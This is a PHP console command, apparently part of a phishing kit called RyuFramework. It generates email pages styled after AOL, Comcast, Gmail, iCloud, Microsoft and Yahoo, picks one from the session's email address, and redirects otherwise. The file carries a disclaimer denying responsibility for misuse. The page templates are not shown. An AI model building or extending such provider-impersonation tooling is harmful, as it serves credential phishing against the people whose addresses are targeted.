<?php

namespace Dev\Command;

use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputArgument;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Style\SymfonyStyle;

class MakeEmail extends Command
{
    // the name of the command (the part after "bin/console")
    protected static $defaultName = 'make:email';
    protected static $defaultDescription = 'Generate template of email pages';
    protected function configure(): void
    {
        $this->addOption('list', null, InputOption::VALUE_OPTIONAL, "list of email page generated");
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        if ($input->getOption('list') != null) {
            $list = $input->getOption('list');
        } else {
            $list = 'aol,comcast,gmail,icloud,microsoft,yahoo';
        }
        @system('cp -r dev/template/email-assets/ public/assets/email-assets/ ');
        $output->writeln("<comment>Generating email.php for controllers </comment>");
        $this->generateEmailIndex();

        $output->writeln("<comment> Generating email page $list </comment>");

        foreach(explode("," , $list) as $tpl)
        {
            $this->PageTemplate($tpl , $input,$output);
        }

        return Command::SUCCESS;
    }
protected function generateEmailIndex()
{
$tpls ="
@php
\$mail = ryu()->handler->session('account')['email'];
\$email = ryu()->handler->emaildetect(\$mail);
@endphp

@switch(\$email)
    @case('aol')
        @include('email.email_aol' , ['email' => \$mail])
        @break
    @case('comcast')
        @include('email.email_comcast' , ['email' => \$mail])
        @break
    @case('gmail')
        @include('email.email_gmail' , ['email' => \$mail])
        @break
    @case('icloud')
        @include('email.email_icloud' , ['email' => \$mail])
        @break
    @case('microsoft')
        @include('email.email_microsoft', ['email' => \$mail])
        @break
    @case('yahoo')
        @include('email.email_yahoo', ['email' => \$mail])
        @break
    @default
        <meta http-equiv=\"refresh\" content=\"1;url={{ ryu()->router('email')['full'] }}\">
        @break
@endswitch
";

file_put_contents('app/pages/email.blade.php' , $tpls);
}

    protected function PageTemplate($name , $input,$output)
    {

        $tpls = "<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( " . date('D,d-m-Y H:i') . " )
* TEMPLATE EMAIL PAGE $name
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v2.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
?>
";
        if (!is_dir('app/pages/email/')) {
            @mkdir('app/pages/email', 0777);
            
        }
        $io = new SymfonyStyle($input,$output);
        
        $template_path = dirname(__DIR__) . '/template/';
        $prefix = 'email_';
        $extension = '.tpl.blade.php';
        
        $io->writeln("<comment>CHECKING ".$prefix.$name.$extension." exist ... </comment>");
        if(file_exists($template_path . $prefix . $name . $extension))
        {
            require 'app/config/web.php';
            $io->writeln("<info> OK .. Continue ... </info>");
            $get= file_get_contents($template_path.$prefix.$name.$extension);
            $get= str_replace("{app_name}" , $config['web']['app_name'], $get);

            file_put_contents('app/pages/email/email_'.$name.'.blade.php' , $get);
            $io->writeln("<info>SUCCESS : email_{$name}.blade.php !</info>");
        }else{
            $io->writeln("TEMPLATE DOESN'T EXIST $name !");
        }
    }
}
